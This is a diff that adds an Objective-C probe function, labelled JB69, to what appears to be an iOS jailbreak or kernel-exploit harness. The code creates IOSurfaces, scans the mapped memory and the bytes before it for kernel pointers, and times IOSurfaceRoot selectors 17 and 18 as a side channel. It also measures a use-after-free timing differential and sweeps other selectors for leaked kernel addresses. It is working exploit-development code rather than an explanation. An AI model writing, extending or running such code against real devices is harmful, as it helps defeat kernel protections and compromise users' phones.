@@ -46817,3 +46817,352 @@ void iosurface_uaf_harvest_v2(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+void iosurface_shmem_timing(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB69: === IOSurface SharedMem + Timing Side-Channel ===");
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB69";
+
+        void *iosfh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+
+        // GG0: Create surface using framework symbol constants
+        log(@"JB69: --- GG0: IOSurfaceCreate with framework constants ---");
+        typedef void*(*ioscrfn)(void*);
+        typedef uint32_t(*iosgidfn)(void*);
+        typedef void*(*iosbasefn)(void*);
+        typedef int(*ioslockfn)(void*, uint32_t, uint32_t*);
+        typedef int(*iosunlockfn)(void*, uint32_t, uint32_t*);
+        typedef size_t(*iossizefn)(void*);
+        typedef size_t(*iosarfn)(void*);
+        typedef size_t(*iosbprfn)(void*);
+        typedef int(*ioslookfn)(uint32_t);
+        typedef void(*cfrel_fn)(void*);
+        typedef const void*(*cfnumcrfn)(void*, unsigned long, const void*);
+
+        ioscrfn sym_create = iosfh ? (ioscrfn)dlsym(iosfh, "IOSurfaceCreate") : NULL;
+        iosgidfn sym_getid = iosfh ? (iosgidfn)dlsym(iosfh, "IOSurfaceGetID") : NULL;
+        iosbasefn sym_getbase = iosfh ? (iosbasefn)dlsym(iosfh, "IOSurfaceGetBaseAddress") : NULL;
+        ioslockfn sym_lock = iosfh ? (ioslockfn)dlsym(iosfh, "IOSurfaceLock") : NULL;
+        iosunlockfn sym_unlock = iosfh ? (iosunlockfn)dlsym(iosfh, "IOSurfaceUnlock") : NULL;
+        iossizefn sym_allocsz = iosfh ? (iossizefn)dlsym(iosfh, "IOSurfaceGetAllocSize") : NULL;
+        iosarfn sym_height = iosfh ? (iosarfn)dlsym(iosfh, "IOSurfaceGetHeight") : NULL;
+        iosbprfn sym_bpr = iosfh ? (iosbprfn)dlsym(iosfh, "IOSurfaceGetBytesPerRow") : NULL;
+
+        // Try loading key constants from framework
+        void **kAllocSize = iosfh ? (void **)dlsym(iosfh, "kIOSurfaceAllocSize") : NULL;
+        void **kWidth = iosfh ? (void **)dlsym(iosfh, "kIOSurfaceWidth") : NULL;
+        void **kHeight = iosfh ? (void **)dlsym(iosfh, "kIOSurfaceHeight") : NULL;
+        void **kBPR = iosfh ? (void **)dlsym(iosfh, "kIOSurfaceBytesPerRow") : NULL;
+        void **kPixFmt = iosfh ? (void **)dlsym(iosfh, "kIOSurfacePixelFormat") : NULL;
+
+        log([NSString stringWithFormat:@"JB69: GG0 create=%p getid=%p getbase=%p lock=%p",
+             sym_create, sym_getid, sym_getbase, sym_lock]);
+        log([NSString stringWithFormat:@"JB69: GG0 kAlloc=%p kW=%p kH=%p kBPR=%p kPF=%p",
+             kAllocSize, kWidth, kHeight, kBPR, kPixFmt]);
+
+        void *surfRef = NULL;
+        uint32_t surfID = 0;
+
+        if (sym_create && sym_getid) {
+            // Method 1: Use framework constants if available
+            if (kAllocSize && *kAllocSize && kWidth && *kWidth && kHeight && *kHeight &&
+                kBPR && *kBPR && kPixFmt && *kPixFmt) {
+                cfnumcrfn sym_numcr = (cfnumcrfn)dlsym(RTLD_DEFAULT, "CFNumberCreate");
+                typedef void*(*cfdictcrfn)(void*, const void**, const void**, long, const void*, const void*);
+                cfdictcrfn sym_dictcr = (cfdictcrfn)dlsym(RTLD_DEFAULT, "CFDictionaryCreate");
+
+                if (sym_numcr && sym_dictcr) {
+                    int v_alloc = 4096, v_w = 64, v_h = 64, v_bpr = 256, v_pf = 0x42475241;
+                    void *n_alloc = sym_numcr(NULL, 3, &v_alloc);
+                    void *n_w = sym_numcr(NULL, 3, &v_w);
+                    void *n_h = sym_numcr(NULL, 3, &v_h);
+                    void *n_bpr = sym_numcr(NULL, 3, &v_bpr);
+                    void *n_pf = sym_numcr(NULL, 3, &v_pf);
+
+                    const void *keys[5] = {*kAllocSize, *kWidth, *kHeight, *kBPR, *kPixFmt};
+                    const void *vals[5] = {n_alloc, n_w, n_h, n_bpr, n_pf};
+                    void *dict = sym_dictcr(NULL, keys, vals, 5, NULL, NULL);
+
+                    if (dict) {
+                        surfRef = sym_create(dict);
+                        surfID = surfRef ? sym_getid(surfRef) : 0;
+                        log([NSString stringWithFormat:@"JB69: GG0 method1 (constants) surfRef=%p surfID=%u", surfRef, surfID]);
+                        cfrel_fn sym_cfr = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+                        if (sym_cfr) sym_cfr(dict);
+                    }
+                    cfrel_fn sym_cfr2 = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+                    if (sym_cfr2) {
+                        if (n_alloc) sym_cfr2(n_alloc);
+                        if (n_w) sym_cfr2(n_w);
+                        if (n_h) sym_cfr2(n_h);
+                        if (n_bpr) sym_cfr2(n_bpr);
+                        if (n_pf) sym_cfr2(n_pf);
+                    }
+                }
+            }
+
+            // Method 2: Try NSDictionary with string keys matching framework
+            if (!surfRef) {
+                NSDictionary *sp = @{
+                    @"IOSurfaceAllocSize": @(4096),
+                    @"IOSurfaceWidth": @(64),
+                    @"IOSurfaceHeight": @(64),
+                    @"IOSurfaceBytesPerRow": @(256),
+                    @"IOSurfacePixelFormat": @(0x42475241),
+                    @"IOSurfaceIsGlobal": @YES
+                };
+                surfRef = sym_create((__bridge void *)sp);
+                surfID = surfRef ? sym_getid(surfRef) : 0;
+                log([NSString stringWithFormat:@"JB69: GG0 method2 (NSDictionary+global) surfRef=%p surfID=%u", surfRef, surfID]);
+            }
+
+            // Method 3: Minimal properties
+            if (!surfRef) {
+                NSDictionary *sp3 = @{@"IOSurfaceAllocSize": @(16384)};
+                surfRef = sym_create((__bridge void *)sp3);
+                surfID = surfRef ? sym_getid(surfRef) : 0;
+                log([NSString stringWithFormat:@"JB69: GG0 method3 (minimal) surfRef=%p surfID=%u", surfRef, surfID]);
+            }
+        }
+        results[@"gg0_surfID"] = @(surfID);
+        results[@"gg0_surfRef"] = [NSString stringWithFormat:@"%p", surfRef];
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // GG1: If surface created, explore shared memory
+        log(@"JB69: --- GG1: Shared memory exploration ---");
+        int gg1_mapped = 0;
+        uint64_t gg1_base = 0;
+        int gg1_kptrs = 0;
+        {
+            if (surfRef && sym_getbase && sym_lock && sym_unlock) {
+                uint32_t seed = 0;
+                int lkr = sym_lock(surfRef, 0, &seed);
+                void *base = sym_getbase(surfRef);
+                gg1_base = (uint64_t)base;
+                size_t allocsz = sym_allocsz ? sym_allocsz(surfRef) : 0;
+                size_t bpr = sym_bpr ? sym_bpr(surfRef) : 0;
+
+                log([NSString stringWithFormat:@"JB69: GG1 lock=%d base=%p allocsz=%zu bpr=%zu seed=%u",
+                     lkr, base, allocsz, bpr, seed]);
+
+                if (base && allocsz > 0) {
+                    gg1_mapped = 1;
+                    // Scan the mapped memory for kernel pointers
+                    uint64_t *v64 = (uint64_t *)base;
+                    size_t nwords = allocsz / 8;
+                    if (nwords > 512) nwords = 512;
+                    for (size_t i = 0; i < nwords; i++) {
+                        if (v64[i] > 0xffff000000000000ULL && v64[i] != 0xffffffffffffffffULL) {
+                            gg1_kptrs++;
+                            if (gg1_kptrs <= 5) {
+                                log([NSString stringWithFormat:@"JB69: GG1 KPTR base[%zu]=0x%llx", i, v64[i]]);
+                            }
+                        }
+                    }
+                    // Check first 64 bytes of mapped region
+                    log([NSString stringWithFormat:@"JB69: GG1 first 8 words: 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx",
+                         v64[0], v64[1], v64[2], v64[3], v64[4], v64[5], v64[6], v64[7]]);
+
+                    // Check for memory before the base address (negative offset metadata)
+                    uint64_t *pre = (uint64_t *)((uint8_t *)base - 64);
+                    log([NSString stringWithFormat:@"JB69: GG1 pre-base[-8..-1]: 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx",
+                         pre[0], pre[1], pre[2], pre[3], pre[4], pre[5], pre[6], pre[7]]);
+                    for (int i = 0; i < 8; i++) {
+                        if (pre[i] > 0xffff000000000000ULL && pre[i] != 0xffffffffffffffffULL) {
+                            gg1_kptrs++;
+                            log([NSString stringWithFormat:@"JB69: GG1 PRE-KPTR [-%d]=0x%llx", 8 - i, pre[i]]);
+                        }
+                    }
+                }
+                sym_unlock(surfRef, 0, &seed);
+            } else {
+                log([NSString stringWithFormat:@"JB69: GG1 no surface or missing symbols (surfRef=%p base=%p lock=%p)",
+                     surfRef, sym_getbase, sym_lock]);
+            }
+        }
+        results[@"gg1_mapped"] = @(gg1_mapped);
+        results[@"gg1_kptrs"] = @(gg1_kptrs);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // GG2: Timing side-channel on sel17/sel18
+        log(@"JB69: --- GG2: Timing side-channel ---");
+        uint64_t gg2_min_ns = UINT64_MAX, gg2_max_ns = 0;
+        {
+            typedef void*(*matching_fn)(const char*);
+            typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+            typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+            typedef int(*svcclose_fn)(unsigned int);
+            typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+            typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+            typedef int(*objrelease_fn)(unsigned int);
+
+            matching_fn sym_m = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+            getmatch_fn sym_g = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+            svcopen_fn sym_o = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+            svcclose_fn sym_sc = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+            callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+            callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+            objrelease_fn sym_r = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+
+            void *sm = sym_m("IOSurfaceRoot");
+            unsigned int ss = sm ? sym_g(0, sm) : 0;
+            unsigned int conn = 0;
+            int okr = ss ? sym_o(ss, mach_task_self(), 0, &conn) : -1;
+            if (ss) sym_r(ss);
+
+            if (okr == 0) {
+                unsigned int wp = jb41_newWakePort();
+                uint32_t useSurfID = surfID > 0 ? surfID : 1;
+
+                // Warm up
+                for (int w = 0; w < 5; w++) {
+                    uint64_t wIn[3] = {useSurfID, (uint64_t)w, 0};
+                    jb41_callSel(conn, 17, wIn, 24, 1, wp, sym_call, sym_async);
+                    jb41_callSel(conn, 18, wIn, 24, 0, wp, sym_call, sym_async);
+                }
+
+                // Measure timing of register with different surfID values
+                typedef uint64_t(*mach_time_fn)(void);
+                mach_time_fn sym_mtime = (mach_time_fn)dlsym(RTLD_DEFAULT, "mach_absolute_time");
+
+                if (sym_mtime) {
+                    uint64_t timings[32] = {0};
+                    for (int t = 0; t < 32 && !isr_stopped(); t++) {
+                        uint64_t testID = (t < 16) ? (uint64_t)(t + 1) : (uint64_t)(0x10000 + t);
+                        uint64_t tIn[3] = {testID, 0x1111, 0x2222};
+
+                        uint64_t t0 = sym_mtime();
+                        int tr = jb41_callSel(conn, 17, tIn, 24, 1, wp, sym_call, sym_async);
+                        uint64_t t1 = sym_mtime();
+
+                        uint64_t dt = t1 - t0;
+                        timings[t] = dt;
+                        if (dt < gg2_min_ns) gg2_min_ns = dt;
+                        if (dt > gg2_max_ns) gg2_max_ns = dt;
+
+                        if (tr == 0) {
+                            jb41_callSel(conn, 18, tIn, 24, 0, wp, sym_call, sym_async);
+                        }
+
+                        if (t < 8 || t >= 28) {
+                            log([NSString stringWithFormat:@"JB69: GG2 t=%d id=%llu dt=%llu rc=0x%x",
+                                 t, testID, dt, (unsigned)tr]);
+                        }
+                    }
+
+                    // Compute timing stats
+                    uint64_t sum = 0;
+                    for (int i = 0; i < 32; i++) sum += timings[i];
+                    uint64_t avg = sum / 32;
+                    uint64_t variance = 0;
+                    for (int i = 0; i < 32; i++) {
+                        int64_t diff = (int64_t)(timings[i] - avg);
+                        variance += (uint64_t)(diff * diff);
+                    }
+                    variance /= 32;
+
+                    log([NSString stringWithFormat:@"JB69: GG2 min=%llu max=%llu avg=%llu var=%llu spread=%llu",
+                         gg2_min_ns, gg2_max_ns, avg, variance, gg2_max_ns - gg2_min_ns]);
+                    results[@"gg2_spread"] = @(gg2_max_ns - gg2_min_ns);
+                    results[@"gg2_avg"] = @(avg);
+                }
+
+                // GG3: UAF + timing — does reading a freed slot take different time?
+                log(@"JB69: --- GG3: UAF timing differential ---");
+                {
+                    uint64_t rIn[3] = {useSurfID, 0xAA00, 0xBB00};
+                    jb41_callSel(conn, 17, rIn, 24, 1, wp, sym_call, sym_async);
+
+                    // Time the deregister (free)
+                    uint64_t t0 = sym_mtime();
+                    jb41_callSel(conn, 18, rIn, 24, 0, wp, sym_call, sym_async);
+                    uint64_t t1 = sym_mtime();
+                    uint64_t free_dt = t1 - t0;
+
+                    // Time re-register (access freed slot)
+                    uint64_t t2 = sym_mtime();
+                    int rr = jb41_callSel(conn, 17, rIn, 24, 1, wp, sym_call, sym_async);
+                    uint64_t t3 = sym_mtime();
+                    uint64_t reuse_dt = t3 - t2;
+
+                    // Time another register (fresh)
+                    uint64_t rIn2[3] = {useSurfID, 0xCC00, 0xDD00};
+                    uint64_t t4 = sym_mtime();
+                    int rr2 = jb41_callSel(conn, 17, rIn2, 24, 1, wp, sym_call, sym_async);
+                    uint64_t t5 = sym_mtime();
+                    uint64_t fresh_dt = t5 - t4;
+
+                    log([NSString stringWithFormat:@"JB69: GG3 free_dt=%llu reuse_dt=%llu fresh_dt=%llu rr=0x%x rr2=0x%x",
+                         free_dt, reuse_dt, fresh_dt, (unsigned)rr, (unsigned)rr2]);
+
+                    jb41_callSel(conn, 18, rIn, 24, 0, wp, sym_call, sym_async);
+                    jb41_callSel(conn, 18, rIn2, 24, 0, wp, sym_call, sym_async);
+
+                    results[@"gg3_free_dt"] = @(free_dt);
+                    results[@"gg3_reuse_dt"] = @(reuse_dt);
+                    results[@"gg3_fresh_dt"] = @(fresh_dt);
+                }
+
+                // GG4: Probe IOSurface sel2 (lookup), sel3-5, sel10-16 for data
+                log(@"JB69: --- GG4: Extended selector scan ---");
+                int gg4_found = 0;
+                {
+                    uint32_t sels[] = {2, 3, 4, 5, 10, 11, 12, 13, 14, 15, 16, 19, 20, 21, 22, 23};
+                    for (int si = 0; si < 16; si++) {
+                        uint64_t sIn[3] = {useSurfID, 0, 0};
+                        uint64_t sOut[8] = {0};
+                        uint32_t sOutC = 8;
+                        uint8_t sSt[256];
+                        memset(sSt, 0, 256);
+                        size_t sStSz = 256;
+
+                        int skr = sym_call(conn, sels[si], NULL, 0, sIn, 24, sOut, &sOutC, sSt, &sStSz);
+
+                        int found = 0;
+                        uint64_t *s64 = (uint64_t *)sSt;
+                        for (int j = 0; j < (int)(sStSz / 8) && j < 32; j++) {
+                            if (s64[j] > 0xffff000000000000ULL && s64[j] != 0xffffffffffffffffULL) {
+                                found++;
+                                gg4_found++;
+                            }
+                        }
+                        for (int j = 0; j < 8; j++) {
+                            if (sOut[j] > 0xffff000000000000ULL && sOut[j] != 0xffffffffffffffffULL) {
+                                found++;
+                                gg4_found++;
+                            }
+                        }
+
+                        log([NSString stringWithFormat:@"JB69: GG4 sel%u kr=0x%x sCnt=%u stSz=%zu s0=0x%llx s1=0x%llx kptr=%d",
+                             sels[si], (unsigned)skr, sOutC, sStSz, sOut[0], sOut[1], found]);
+                    }
+                }
+                results[@"gg4_found"] = @(gg4_found);
+
+                jb41_dropPort(wp);
+                sym_sc(conn);
+            }
+        }
+
+        int total_kptrs = gg1_kptrs + gg4_found;
+        NSString *verdict = @"NO_LEAK";
+        if (total_kptrs > 0) {
+            verdict = [NSString stringWithFormat:@"KPTR_%d_g1_%d_g4_%d", total_kptrs, gg1_kptrs, gg4_found];
+        } else if (gg1_mapped) {
+            verdict = [NSString stringWithFormat:@"SHMEM_OK_base_0x%llx_NO_KPTR", gg1_base];
+        } else if (surfID > 0) {
+            verdict = @"SURFACE_OK_NO_MAP";
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB69: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB69-shmem-timing-checkpoint.json", results);
+
+        cfrel_fn sym_cfr = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+        if (surfRef && sym_cfr) sym_cfr(surfRef);
+        done(results);
+    });
+}
